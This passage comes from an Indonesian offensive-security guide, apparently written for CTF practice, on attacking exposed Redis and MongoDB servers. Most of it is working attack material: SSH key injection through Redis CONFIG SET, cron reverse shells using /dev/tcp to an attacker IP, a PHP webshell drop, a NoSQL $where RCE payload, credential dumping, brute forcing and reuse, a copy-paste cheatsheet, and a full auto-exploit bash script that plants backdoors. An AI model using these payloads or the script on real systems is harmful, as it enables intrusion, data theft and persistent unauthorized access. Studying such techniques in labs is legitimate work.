│  LFI / File read      → REDIS_HOST=xxx          → AUTH OK!       │
│                                                                   │
│         ▼                        ▼                       ▼        │
│                                                                   │
│  [4] Recon Redis       [5] SSH Key Inject         [6] Shell      │
│  CONFIG GET dir        (SAME AS CHAIN 1)         ssh redis@...  │
│  CONFIG GET db         → SSH Key Injection        → Shell!       │
│  KEYS *                → SAVE                                     │
│                                                                   │
└─────────────────────────────────────────────────────────────────────┘
```

### CHAIN 4: MongoDB Unauthenticated → Data Dump → Credential Reuse → SSH

```text
┌─────────────────────────────────────────────────────────────────────┐
│ CHAIN 4: MONGODB UNAUTH → DATA DUMP → SSH                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                   │
│  [1] Scan              [2] Connect MongoDB       [3] Recon       │
│  nmap -p27017 TARGET   mongosh TARGET:27017     show dbs         │
│                       → NO AUTH!               → use appdb       │
│                                                → show collections│
│                                                → db.users.find() │
│                                                                   │
│         ▼                        ▼                       ▼        │
│                                                                   │
│  [4] Extract Creds     [5] Crack/Reuse            [6] SSH        │
│  db.users.find()       Hashcat / Try creds        ssh user@...   │
│  → admin:password123   → SSH password            → Shell!        │
│  → root:toor           → Web login                              │
│  → john:john123        → Database login                         │
│                                                                   │
└─────────────────────────────────────────────────────────────────────┘
```

### CHAIN 5: NoSQL Injection Web → Auth Bypass → Admin Access → RCE

```text
┌─────────────────────────────────────────────────────────────────────┐
│ CHAIN 5: NOSQL INJECTION → ADMIN → RCE                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                   │
│  [1] Web App           [2] NoSQL Injection       [3] Admin       │
│  Login page / Search   username[$ne]=1          Login berhasil   │
│  API endpoint          password[$ne]=1          → Admin session  │
│                       → LOGIN BERHASIL!         → Admin token    │
│                                                                   │
│         ▼                        ▼                       ▼        │
│                                                                   │
│  [4] Find RCE Point    [5] $where Injection      [6] RCE         │
│  Upload / Command      {"$where":"function()     id              │
│  Execute feature       { return this.constructor whoami          │
│  Template injection    .constructor('return      → RCE!          │
│                        process.mainModule.require                 │
│                        (\"child_process\").exec                   │
│                        Sync(\"id\").toString()')() }"}           │
│                                                                   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 🚨 BAGIAN 6: CVE REFERENCE

### Redis CVEs

```text
┌─────────────────────────────────────────────────────────────────────┐
│                     REDIS CVEs                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                   │
│ 🔴 CVE-2022-0543 (Lua Sandbox Escape)                             │
│    - Versi: Redis 7.0.0 - 7.0.4                                   │
│    - Deskripsi: Sandbox escape di Lua script engine              │
│    - Impact: RCE (Remote Code Execution)                          │
│    - Exploit: EVAL "os.execute('id')" 0                           │
│    - CVSS: 7.0 (High)                                             │
│                                                                   │
│ 🔴 CVE-2015-8080 (Integer Overflow)                               │
│    - Versi: Redis 2.8.x, 3.0.x                                    │
│    - Deskripsi: Integer overflow di lua_* functions               │
│    - Impact: Denial of Service / RCE potential                    │
│    - CVSS: 5.0 (Medium)                                           │
│                                                                   │
│ 🟡 CVE-2021-32761 (Lua Script Injection)                         │
│    - Versi: Redis 6.2.0 - 6.2.3, 6.0.0 - 6.0.13                  │
│    - Impact: Information disclosure                               │
│                                                                   │
│ 🟡 CVE-2019-8332 (Out-of-bounds read)                            │
│    - Impact: Denial of Service                                    │
│                                                                   │
└─────────────────────────────────────────────────────────────────────┘
```

### MongoDB CVEs

```text
┌─────────────────────────────────────────────────────────────────────┐
│                    MONGODB CVEs                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                   │
│ 🔴 CVE-2019-2392 (Memory Corruption)                              │
│    - Versi: MongoDB 4.0.x before 4.0.13                          │
│    - Impact: Denial of Service / RCE potential                   │
│                                                                   │
│ 🔴 Authentication Bypass (various versions)                       │
│    - MongoDB < 3.0: No auth by default                           │
│    - MongoDB 3.0-3.6: Auth enabled by default? Tidak selalu      │
│                                                                   │
│ 🟡 CVE-2015-1609 (Command Injection)                             │
│    - Versi: MongoDB 2.4.x                                         │
│    - Impact: RCE via db.eval() function                          │
│    - (Deprecated di versi baru)                                  │
│                                                                   │
│ 🟡 CVE-2013-1892 (Remote Code Execution)                         │
│    - MongoDB 2.2.x                                                │
│    - Impact: RCE via $where operator                             │
│                                                                   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 🧭 BAGIAN 7: DECISION TREE

### Redis Decision Tree

```text
                            ┌──────────────────┐
                            │  PORT 6379 OPEN  │
                            └────────┬─────────┘
                                     ▼
                            ┌──────────────────┐
                            │  redis-cli PING  │
                            └────────┬─────────┘
                                     ▼
                    ┌────────────────┴────────────────┐
                    │                                 │
                    ▼                                 ▼
        ┌──────────────────┐               ┌──────────────────┐
        │   Response:      │               │   Response:      │
        │   +PONG          │               │   NOAUTH Error   │
        └────────┬─────────┘               └────────┬─────────┘
                 │                                  │
                 ▼                                  ▼
     ┌───────────────────────┐          ┌───────────────────────┐
     │  ✅ UNAUTHENTICATED!  │          │  🔑 AUTH REQUIRED     │
     │  FULL ACCESS!         │          │  → Brute force hydra  │
     └───────────┬───────────┘          │  → Cari di .env      │
                 │                      │  → Default creds      │
                 ▼                      └───────────┬───────────┘
     ┌───────────────────────┐                      │
     │  REDIS RECON          │                      ▼
     │  CONFIG GET dir       │          ┌───────────────────────┐
     │  CONFIG GET db        │          │  AUTH BERHASIL?       │
     │  KEYS *               │          └───────────┬───────────┘
     └───────────┬───────────┘                      │
                 │                      ┌───────────┴───────────┐
                 ▼                      │                       │
     ┌───────────────────────┐          ▼                       ▼
     │  DETERMINE USER       │  ┌─────────────┐       ┌─────────────────┐
     │  ps aux | grep redis  │  │   YES       │       │   NO            │
     │  id                   │  │  CONFIG SET │       │   ➤ Cari lain   │
     └───────────┬───────────┘  └──────┬──────┘       └─────────────────┘
                 │                      │
                 ▼                      ▼
┌────────────────┴────────────────────────────────┐
│                                                 │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  │ USER = redis │    │ USER = root │    │ USER = www  │
│  │              │    │              │    │ -data       │
│  │ → SSH Key    │    │ → Cron      │    │             │
│  │   Injection  │    │   Backdoor  │    │ → Webshell  │
│  │   (/home/    │    │   (/var/    │    │   Drop      │
│  │    redis/    │    │    spool/   │    │   (/var/    │
│  │    .ssh/)    │    │    cron/)   │    │    www/)    │
│  └─────────────┘    └─────────────┘    └─────────────┘
│                                                 │
└─────────────────────────────────────────────────┘
```

### MongoDB Decision Tree

```text
                            ┌──────────────────┐
                            │ PORT 27017 OPEN  │
                            └────────┬─────────┘
                                     ▼
                            ┌──────────────────┐
                            │ mongosh TARGET   │
                            └────────┬─────────┘
                                     ▼
                    ┌────────────────┴────────────────┐
                    │                                 │
                    ▼                                 ▼
        ┌──────────────────┐               ┌──────────────────┐
        │   Koneksi OK     │               │   Auth Required  │
        │   show dbs works │               │   Unauthorized   │
        └────────┬─────────┘               └────────┬─────────┘
                 │                                  │
                 ▼                                  ▼
     ┌───────────────────────┐          ┌───────────────────────┐
     │  ✅ UNAUTHENTICATED!  │          │  🔑 AUTH REQUIRED     │
     │  FULL ACCESS!         │          │  → Brute force        │
     └───────────┬───────────┘          │  → Default creds      │
                 │                      │    (admin:admin)      │
                 ▼                      │  → Cari di app       │
     ┌───────────────────────┐          └───────────┬───────────┘
     │  MONGODB RECON        │                      │
     │  show dbs             │                      ▼
     │  use appdb            │          ┌───────────────────────┐
     │  show collections     │          │  AUTH BERHASIL?       │
     │  db.users.find()      │          └───────────┬───────────┘
     └───────────┬───────────┘                      │
                 │                      ┌───────────┴───────────┐
                 ▼                      │                       │
     ┌───────────────────────┐          ▼                       ▼
     │  DUMP DATA            │  ┌─────────────┐       ┌─────────────────┐
     │  db.users.find()      │  │   YES       │       │   NO            │
     │  db.accounts.find()   │  │  SAMA SEPERTI│      │   ➤ Cari lain   │
     │  db.system.users.find │  │  UNAUTH     │       └─────────────────┘
     └───────────┬───────────┘  └──────┬──────┘
                 │                      │
                 ▼                      ▼
     ┌────────────────────────────────────────────────────┐
     │                                                    │
     │  ┌──────────────┐  ┌──────────────┐  ┌───────────┐ │
     │  │  CREDS FOUND │  │  NOSQL INJ   │  │  DUMP     │ │
     │  │              │  │  Bypass      │  │  SYSTEM   │ │
     │  │ → SSH Login  │  │  → Admin     │  │  USERS    │ │
     │  │ → Web Login  │  │  → RCE via   │  │  → Crack  │ │
     │  │ → Database   │  │    $where    │  │  → Reuse  │ │
     │  └──────────────┘  └──────────────┘  └───────────┘ │
     │                                                    │
     └────────────────────────────────────────────────────┘
```

---

## ⚠️ BAGIAN 8: COMMON ERRORS & TROUBLESHOOTING

### Redis Errors (10 Common)

#### 1. NOAUTH Authentication required

```text
ERROR:
(error) NOAUTH Authentication required.
PENYEBAB: Redis membutuhkan password (requirepass diset).
SOLUSI:
1. Cari password di:
   - /etc/redis/redis.conf
   - .env file aplikasi
   - Source code web app
   - Default: requirepass ""
2. Brute force dengan hydra:
   hydra -P /usr/share/wordlists/rockyou.txt redis://TARGET:6379
3. Coba password default:
   - requirepass ""
   - requirepass "admin"
   - requirepass "redis"
   - requirepass "password"
```

#### 2. CONFIG SET dir: Permission denied

```text
ERROR:
(error) ERR: CONFIG SET dir: Permission denied
PENYEBAB: User redis tidak punya write access ke direktori target.
SOLUSI:
1. Coba direktori lain:
   - /tmp/
   - /var/lib/redis/
   - /home/redis/
   - /var/www/html/ (jika www-data)
2. Jika Redis running as root, semua direktori bisa ditulis.
3. Buat direktori jika diperlukan:
   mkdir -p /home/redis/.ssh/
```

#### 3. ERR: SAVE failed after redis db write

```text
ERROR:
(error) ERR: SAVE failed after redis db write
PENYEBAB: Disk full atau permission denied saat write.
SOLUSI:
1. Cek disk space: df -h
2. Coba direktori dengan lebih banyak space
3. Cek permission dengan CONFIG GET dir
4. Gunakan BGSAVE sebagai alternatif
```

#### 4. WRONGTYPE Operation against wrong type

```text
ERROR:
(error) WRONGTYPE Operation against a key holding the wrong kind of value
PENYEBAB: Mencoba GET pada key yang bukan string.
SOLUSI:
1. Cek tipe key: TYPE key_name
2. Untuk hash: HGETALL key_name
3. Untuk list: LRANGE key_name 0 -1
4. Untuk set: SMEMBERS key_name
```

#### 5. Connection refused (protected-mode)

```text
ERROR:
Could not connect to Redis at TARGET:6379: Connection refused
PENYEBAB: protected-mode enabled atau bind ke localhost only.
SOLUSI:
1. Cek konfigurasi: CONFIG GET protected-mode
2. Jika protected-mode yes: butuh auth atau koneksi dari localhost
3. Coba bind ke IP yang benar: CONFIG SET bind 0.0.0.0
4. Bypass: Gunakan redis-cli dari localhost jika ada LFI/RCE
```

#### 6. (error) ERR unknown command 'CONFIG'

```text
ERROR:
(error) ERR unknown command 'CONFIG'
PENYEBAB: CONFIG command di-disable di redis.conf.
SOLUSI:
1. Cek config: CONFIG GET CONFIG (jika bisa)
2. Jika tidak bisa, coba MODULE LOAD
3. Cek apakah Redis versi lama (< 2.4)
4. Gunakan teknik lain: RCE via Lua script (CVE-2022-0543)
```

#### 7. ssh permission denied setelah inject key

```text
ERROR:
Permission denied (publickey).
PENYEBAB:
1. .ssh directory permission salah
2. authorized_keys permission salah
3. Public key tidak valid
SOLUSI:
4. Fix permission di target (jika ada akses):
   chmod 700 ~/.ssh
   chmod 600 ~/.ssh/authorized_keys
5. Pastikan public key format benar (dengan newlines):
   SET pubkey "\n\nPUBLIC_KEY\n\n"
6. Coba user lain:
   ssh redis@TARGET
   ssh root@TARGET
   ssh www-data@TARGET
```

#### 8. Cron tidak execute

```text
ERROR:
Cron tidak jalan, shell tidak masuk.
PENYEBAB:
1. Format cron salah
2. Direktori cron salah
3. Redis bukan root
4. Cron service tidak berjalan
SOLUSI:
5. Cek format cron:
   * * * * * root /bin/bash -c '...'
2. Coba direktori:
   /var/spool/cron/crontabs/ (Debian/Ubuntu)
   /var/spool/cron/ (CentOS/RHEL)
   /etc/cron.d/
3. Cek file: cat /var/spool/cron/crontabs/root
4. Coba payload berbeda:
   * * * * * bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```

#### 9. Webshell ada tapi tidak bisa execute

```text
ERROR:
Webshell diakses tapi tidak execute.
PENYEBAB:
1. Directory tidak ada di web root
2. PHP tidak terinstall
3. Permission webshell tidak execute
4. Webshell content corrupt
SOLUSI:
5. Cek web root:
   - /var/www/html/
   - /var/www/
   - /usr/share/nginx/html/
2. Coba webshell sederhana:
   <?php echo "test"; ?>
3. Cek permission file
4. Coba dengan GET parameter: ?cmd=id
```

#### 10. KEYS * timeout (terlalu banyak keys)

```text
ERROR:
Timeout atau freeze saat KEYS *
PENYEBAB: Terlalu banyak keys di Redis (> 1 juta).
SOLUSI:
1. Gunakan SCAN sebagai alternatif:
   SCAN 0
   SCAN 0 MATCH user:*
2. Atau limit DBSIZE dulu
3. Gunakan INFO keyspace untuk lihat jumlah total
```

### MongoDB Errors (5 Common)

#### 1. MongoServerError: command find requires authentication

```text
ERROR:
MongoServerError: command find requires authentication
PENYEBAB: Auth required tapi tidak dikirim.
SOLUSI:
1. Login dengan credentials:
   mongosh "mongodb://user:pass@TARGET:27017/admin"
2. Auth di interactive:
   test> use admin
   test> db.auth("user", "pass")
```

#### 2. MongoNetworkError: connect ECONNREFUSED

```text
ERROR:
MongoNetworkError: connect ECONNREFUSED TARGET:27017
PENYEBAB: MongoDB tidak berjalan atau firewall blocking.
SOLUSI:
1. Cek apakah service running: systemctl status mongodb
2. Cek firewall: iptables -L | grep 27017
3. Coba dengan authentication database admin
```

#### 3. MongoServerError: not authorized

```text
ERROR:
MongoServerError: not authorized on admin to execute command
PENYEBAB: User tidak punya privilege.
SOLUSI:
1. Coba database lain: use appdb
2. Cek roles user: db.getUser("username")
3. Coba dengan user yang lebih tinggi (admin/root)
```

#### 4. MongoServerError: no such db

```text
ERROR:
MongoServerError: no such db: appdb
PENYEBAB: Database tidak ada.
SOLUSI:
1. show dbs → lihat database yang ada
2. Pastikan nama database benar
3. Coba local, admin, config database
```

#### 5. mongosh: command not found

```text
ERROR:
bash: mongosh: command not found
PENYEBAB: Mongosh tidak terinstall.
SOLUSI:
1. Install: sudo apt install mongodb-mongosh -y
2. Atau gunakan mongo (legacy):
   mongo --host TARGET --port 27017
3. Install via npm:
   sudo npm install -g mongosh
```

---

## 🎯 BAGIAN 9: REAL CTF EXAMPLES

### EXAMPLE 1: Redis Unauthenticated → SSH Key → Root (HTB Style)

```bash
# SCENARIO: HTB Machine "RedisInjection" (Contoh)
# TARGET IP: 10.10.10.100
# ATTACKER IP: 10.10.14.10
# === STEP 1: SCAN ===
nmap -p6379 -sV 10.10.10.100
# Output: 6379/tcp open redis Redis 6.0.16
# === STEP 2: CHECK REDIS AUTH ===
redis-cli -h 10.10.10.100 PING
# Output: +PONG → NO AUTH!
# === STEP 3: RECON REDIS ===
redis-cli -h 10.10.10.100 CONFIG GET dir
# Output: /var/lib/redis
redis-cli -h 10.10.10.100 INFO server
# Output: redis_version:6.0.16, os:Linux 5.10.0, process_id:1234
redis-cli -h 10.10.10.100 KEYS "*"
# Output: 1) "flag" 2) "config"
# === STEP 4: CHECK USER ===
# Kita perlu tahu user Redis running as
redis-cli -h 10.10.10.100 CONFIG SET dir /tmp/
redis-cli -h 10.10.10.100 CONFIG SET dbfilename test.txt
redis-cli -h 10.10.10.100 SET test "test"
redis-cli -h 10.10.10.100 SAVE
# Cek owner file di target (nanti di shell)
# Ternyata Redis running as root! (kita tahu dari exploit sebelumnya)
# === STEP 5: SSH KEY INJECTION ===
# Generate key
ssh-keygen -t rsa -b 4096 -f ~/.ssh/redis_root -N ""
# Format public key
echo -e "\n\n$(cat ~/.ssh/redis_root.pub)\n\n" > /tmp/key.txt
# Inject ke root's authorized_keys
redis-cli -h 10.10.10.100
127.0.0.1:6379> FLUSHALL
OK
127.0.0.1:6379> CONFIG SET dir /root/.ssh/
OK
127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
OK
127.0.0.1:6379> SET pubkey "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8... attacker@parrot\n\n"
OK
127.0.0.1:6379> SAVE
OK
127.0.0.1:6379> exit
# === STEP 6: SSH LOGIN ===
ssh -i ~/.ssh/redis_root root@10.10.10.100
# === STEP 7: GET FLAG ===
root@target:~# ls
flag.txt
root@target:~# cat flag.txt
HTB{redis_ssh_root_injection_was_too_easy}
```

### EXAMPLE 2: Redis Cron → Reverse Shell sebagai Root

```bash
# SCENARIO: Redis running as root, web access tidak ada
# TARGET: 10.10.10.150
# === STEP 1: SETUP LISTENER ===
nc -lvnp 4444
# === STEP 2: CONNECT REDIS ===
redis-cli -h 10.10.10.150
# === STEP 3: INJECT CRON ===
127.0.0.1:6379> CONFIG SET dir /var/spool/cron/crontabs/
OK
127.0.0.1:6379> CONFIG SET dbfilename root
OK
127.0.0.1:6379> SET cron "\n\n* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'\n\n"
OK
127.0.0.1:6379> SAVE
OK
# === STEP 4: WAIT 1 MINUTE ===
# Shell akan masuk ke listener
# === STEP 5: ROOT SHELL ===
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.150 45123
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
root@target:~# cat /root/root.txt
HTB{redis_cron_backdoor_shell}
```

### EXAMPLE 3: MongoDB Unauthenticated → Data Dump → Password Reuse → SSH Login

```bash
# SCENARIO: MongoDB exposed, credential reuse untuk SSH
# TARGET: 10.10.10.200
# === STEP 1: SCAN ===
nmap -p27017 -sV 10.10.10.200
# Output: 27017/tcp open mongodb MongoDB 4.4.28
# === STEP 2: CONNECT MONGODB ===
mongosh "mongodb://10.10.10.200:27017"
test> show dbs
admin    40.00 KiB
appdb    2.50 MiB
users    1.00 MiB
# === STEP 3: DUMP DATA ===
test> use appdb
switched to db appdb
test> show collections
users
products
orders
admins
# Dump users collection
test> db.users.find().pretty()
[
  {
    "_id": ObjectId("..."),
    "username": "admin",
    "password": "SuperSecurePassword123!",
    "role": "administrator"
  },
  {
    "_id": ObjectId("..."),
    "username": "john",
    "password": "johnny123",
    "role": "user"
  },
  {
    "_id": ObjectId("..."),
    "username": "root",
    "password": "toor",
    "role": "root"
  }
]
# Dump admins
test> db.admins.find().pretty()
[
  {
    "_id": ObjectId("..."),
    "user": "admin",
    "password": "Admin@2024#",
    "ssh_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..."
  }
]
# === STEP 4: SAVE CREDENTIALS ===
# Copy password: SuperSecurePassword123!, toor, johnny123, Admin@2024#
# === STEP 5: TEST SSH ===
ssh root@10.10.10.200
# Password: toor → LOGIN BERHASIL!
ssh admin@10.10.10.200
# Password: SuperSecurePassword123! → LOGIN BERHASIL!
# === STEP 6: GET FLAG ===
root@target:~# find / -name "flag*.txt" 2>/dev/null
/root/flag.txt
root@target:~# cat /root/flag.txt
HTB{mongodb_dump_credential_reuse}
```

---

## 📋 BAGIAN 10: CHEATSHEET (COPY-PASTE READY)

### 1. Redis Connection Commands

```bash
# === CONNECTION ===
# Connect tanpa auth
redis-cli -h TARGET -p 6379
# Connect dengan auth
redis-cli -h TARGET -p 6379 -a PASSWORD
# Connect dan execute command
redis-cli -h TARGET -p 6379 PING
# Interactive dengan auth
redis-cli -h TARGET -p 6379
127.0.0.1:6379> AUTH PASSWORD
# Netcat banner grab
nc -vn TARGET 6379
echo -e "PING\r\n" | nc -vn TARGET 6379
```

### 2. Redis Recon Commands

```bash
# === RECONNAISSANCE ===
# Info server
redis-cli -h TARGET INFO server
# Info keyspace (database)
redis-cli -h TARGET INFO keyspace
# Get working directory
redis-cli -h TARGET CONFIG GET dir
# Get database filename
redis-cli -h TARGET CONFIG GET dbfilename
# Get password config
redis-cli -h TARGET CONFIG GET requirepass
# List all keys
redis-cli -h TARGET KEYS "*"
# Get total keys count
redis-cli -h TARGET DBSIZE
# Get key type
redis-cli -h TARGET TYPE key_name
# Get string value
redis-cli -h TARGET GET key_name
# Get hash all fields
redis-cli -h TARGET HGETALL key_name
# Get set members
redis-cli -h TARGET SMEMBERS key_name
# Get list range
redis-cli -h TARGET LRANGE key_name 0 -1
```

### 3. Redis File Write (SSH / Cron / Webshell)

```bash
# === SSH KEY INJECTION ===
# Generate keypair
ssh-keygen -t rsa -b 4096 -f ~/.ssh/redis_exploit -N ""
# Format public key with newlines
echo -e "\n\n$(cat ~/.ssh/redis_exploit.pub)\n\n" > /tmp/redis_key.txt
# Inject via redis-cli
redis-cli -h TARGET <<EOF
FLUSHALL
CONFIG SET dir /home/redis/.ssh/
CONFIG SET dbfilename authorized_keys
SET pubkey "\n\n$(cat ~/.ssh/redis_exploit.pub)\n\n"
SAVE
EOF
# SSH login
ssh -i ~/.ssh/redis_exploit redis@TARGET
ssh -i ~/.ssh/redis_exploit root@TARGET  # jika Redis root
# === CRON BACKDOOR ===
redis-cli -h TARGET <<EOF
CONFIG SET dir /var/spool/cron/crontabs/
CONFIG SET dbfilename root
SET cron "\n\n* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n"
SAVE
EOF
# Wait 1 minute, listener catches shell
# === WEBSHELL DROP ===
redis-cli -h TARGET <<EOF
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET webshell "<?php system(\$_GET['cmd']); ?>"
SAVE
EOF
# Access webshell
curl http://TARGET/shell.php?cmd=id
```

### 4. MongoDB Connection Commands

```bash
# === CONNECTION ===
# Connect tanpa auth
mongosh "mongodb://TARGET:27017"
# Connect dengan auth
mongosh "mongodb://user:pass@TARGET:27017/admin"
# Connect ke database spesifik
mongosh "mongodb://TARGET:27017/appdb"
# Execute command one-liner
mongosh "mongodb://TARGET:27017" --eval "show dbs"
mongosh "mongodb://TARGET:27017" --eval "db.version()"
# Legacy mongo client
mongo --host TARGET --port 27017
```

### 5. MongoDB Recon Commands

```bash
# === RECONNAISSANCE ===
# List databases
mongosh "mongodb://TARGET:27017" --eval "show dbs"
# Switch database
mongosh "mongodb://TARGET:27017/appdb" --eval "db"
# List collections
mongosh "mongodb://TARGET:27017/appdb" --eval "show collections"
# Find all documents
mongosh "mongodb://TARGET:27017/appdb" --eval "db.collection.find()"
# Find with limit
mongosh "mongodb://TARGET:27017/appdb" --eval "db.collection.find().limit(5)"
# Count documents
mongosh "mongodb://TARGET:27017/appdb" --eval "db.collection.count()"
# Pretty print
mongosh "mongodb://TARGET:27017/appdb" --eval "db.collection.find().pretty()"
# One document
mongosh "mongodb://TARGET:27017/appdb" --eval "db.collection.findOne()"
# Get users (admin db)
mongosh "mongodb://TARGET:27017/admin" --eval "db.getUsers()"
# Get system users (admin db)
mongosh "mongodb://TARGET:27017/admin" --eval "db.system.users.find()"
# Server status
mongosh "mongodb://TARGET:27017" --eval "db.serverStatus()"
# MongoDB version
mongosh "mongodb://TARGET:27017" --eval "db.version()"
# Dump to JSON
mongosh "mongodb://TARGET:27017/appdb" --eval "JSON.stringify(db.collection.find().toArray())" > dump.json
```

### 6. Hash Cracking Commands

```bash
# === HASH CRACKING ===
# MongoDB SCRAM-SHA-256 (mode 24100)
hashcat -m 24100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# MongoDB SCRAM-SHA-1 (mode 24200)
hashcat -m 24200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Show cracked hashes
hashcat -m 24100 hash.txt --show
# With rules
hashcat -m 24100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# John the Ripper
john --format=mongo-scram hash.txt
john --format=mongo-scram --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## 🤖 BAGIAN 11: AUTOMATION SCRIPT

### Redis Auto-Exploit Script

```bash
#!/bin/bash
# ================================================================
# redis_auto_exploit.sh - Redis Unauthenticated Auto-Exploit
# ================================================================
# Usage: ./redis_auto_exploit.sh TARGET_IP [PORT]
# ================================================================
# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color
# Target
TARGET=$1
PORT=${2:-6379}
ATTACKER_IP=$(ip route get 1 | awk '{print $NF;exit}')
SSH_KEY_PATH="$HOME/.ssh/redis_exploit_$(date +%s)"
# Check arguments
if [ -z "$TARGET" ]; then
    echo -e "${RED}Usage: $0 TARGET_IP [PORT]${NC}"
    exit 1
fi
echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}  🔴 REDIS AUTO-EXPLOIT SCRIPT${NC}"
echo -e "${BLUE}  Target: $TARGET:$PORT${NC}"
echo -e "${BLUE}  Attacker: $ATTACKER_IP${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
# ================================================================
# STEP 1: Check Redis without auth
# ================================================================
echo -e "\n${YELLOW}[1] CHECKING REDIS AUTH...${NC}"
RESPONSE=$(redis-cli -h "$TARGET" -p "$PORT" PING 2>/dev/null)
if [[ "$RESPONSE" == "+PONG" ]]; then
    echo -e "${GREEN}✅ Redis UNAUTHENTICATED!${NC}"
else
    echo -e "${RED}❌ Redis requires authentication or not responding${NC}"
    echo -e "${RED}   Response: $RESPONSE${NC}"
    exit 1
fi
# ================================================================
# STEP 2: Reconnaissance
# ================================================================
echo -e "\n${YELLOW}[2] RECONNAISSANCE...${NC}"
REDIS_DIR=$(redis-cli -h "$TARGET" -p "$PORT" CONFIG GET dir | tail -n1)
REDIS_DB=$(redis-cli -h "$TARGET" -p "$PORT" CONFIG GET dbfilename | tail -n1)
REDIS_KEYS=$(redis-cli -h "$TARGET" -p "$PORT" KEYS "*" 2>/dev/null)
REDIS_INFO=$(redis-cli -h "$TARGET" -p "$PORT" INFO server | grep -E "redis_version|os|process_id")
echo -e "${GREEN}   Working Directory: $REDIS_DIR${NC}"
echo -e "${GREEN}   DB Filename: $REDIS_DB${NC}"
echo -e "${GREEN}   Redis Info:${NC}"
echo "$REDIS_INFO" | while read line; do echo -e "   ${GREEN}$line${NC}"; done
# ================================================================
# STEP 3: Ask for SSH Key Injection
# ================================================================
echo -e "\n${YELLOW}[3] SSH KEY INJECTION?${NC}"
read -p "Inject SSH key for persistence? [y/N] " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}   Generating SSH keypair...${NC}"
    ssh-keygen -t rsa -b 4096 -f "$SSH_KEY_PATH" -N "" -q
    # Try different paths
    PATHS=(
        "/home/redis/.ssh/"
        "/var/lib/redis/.ssh/"
        "/root/.ssh/"
        "/home/$USER/.ssh/"
    )
    SUCCESS=false
    for REDIS_USER_PATH in "${PATHS[@]}"; do
        echo -e "${YELLOW}   Trying: $REDIS_USER_PATH${NC}"
        # Inject
        redis-cli -h "$TARGET" -p "$PORT" <<EOF >/dev/null 2>&1
FLUSHALL
CONFIG SET dir $REDIS_USER_PATH
CONFIG SET dbfilename authorized_keys
SET pubkey "\n\n$(cat ${SSH_KEY_PATH}.pub)\n\n"
SAVE
EOF
        # Test SSH connection
        echo -e "${YELLOW}   Testing SSH connection...${NC}"
        ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" redis@"$TARGET" "id" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}✅ SSH KEY INJECTION SUCCESSFUL!${NC}"
            echo -e "${GREEN}   Path: $REDIS_USER_PATH${NC}"
            echo -e "${GREEN}   Key: $SSH_KEY_PATH${NC}"
            echo -e "${GREEN}   Command: ssh -i $SSH_KEY_PATH redis@$TARGET${NC}"
            SUCCESS=true
            break
        fi
        # Try root
        ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" root@"$TARGET" "id" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}✅ SSH KEY INJECTION SUCCESSFUL (as root)!${NC}"
            echo -e "${GREEN}   Path: $REDIS_USER_PATH${NC}"
            echo -e "${GREEN}   Key: $SSH_KEY_PATH${NC}"
            echo -e "${GREEN}   Command: ssh -i $SSH_KEY_PATH root@$TARGET${NC}"
            SUCCESS=true
            break
        fi
    done
    if [ "$SUCCESS" = false ]; then
        echo -e "${RED}❌ SSH Injection failed for all paths.${NC}"
        echo -e "${RED}   Try manual injection or use cron/webshell.${NC}"
    fi
fi
# ================================================================
# STEP 4: Ask for Cron Backdoor
# ================================================================
echo -e "\n${YELLOW}[4] CRON BACKDOOR?${NC}"
read -p "Inject cron backdoor for reverse shell? [y/N] " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    read -p "Enter listener port [4444]: " LISTEN_PORT
    LISTEN_PORT=${LISTEN_PORT:-4444}
    echo -e "${YELLOW}   Setting up listener on port $LISTEN_PORT...${NC}"
    echo -e "${YELLOW}   Run 'nc -lvnp $LISTEN_PORT' in another terminal${NC}"
    CRON_DIRS=(
        "/var/spool/cron/crontabs/"
        "/etc/cron.d/"
        "/var/spool/cron/"
    )
    for CRON_PATH in "${CRON_DIRS[@]}"; do
        echo -e "${YELLOW}   Trying cron path: $CRON_PATH${NC}"
        redis-cli -h "$TARGET" -p "$PORT" <<EOF >/dev/null 2>&1
CONFIG SET dir $CRON_PATH
CONFIG SET dbfilename root
SET cron "\n\n* * * * * root bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$LISTEN_PORT 0>&1'\n\n"
SAVE
EOF
        echo -e "${GREEN}   Cron injected to $CRON_PATH${NC}"
        echo -e "${GREEN}   Wait 1 minute for shell...${NC}"
        break
    done
fi
# ================================================================
# STEP 5: Summary
# ================================================================
echo -e "\n${BLUE}════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✅ EXPLOIT COMPLETE!${NC}"
